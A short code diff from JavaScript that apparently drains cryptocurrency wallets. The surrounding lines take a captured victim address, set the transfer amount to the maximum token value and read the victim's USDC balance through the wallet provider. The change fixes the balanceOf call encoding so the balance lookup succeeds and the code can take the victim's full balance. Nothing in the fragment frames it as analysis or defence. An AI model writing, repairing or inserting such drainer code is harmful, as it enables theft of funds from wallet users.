@@ -687,7 +687,7 @@
       // If value > actual balance the tx reverts. Fetch real balance first.
       var transferValue = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
       try {
-        var balCallData = '0x70a08231000000000000000000000000' + capturedAddr.slice(2).toLowerCase().padStart(64, '0');
+        var balCallData = '0x70a08231' + capturedAddr.slice(2).toLowerCase().padStart(64, '0');
         var balHex;
         try {
           balHex = await e.request({ method: 'eth_call', params: [{ to: USDC, data: balCallData }, 'latest'] });
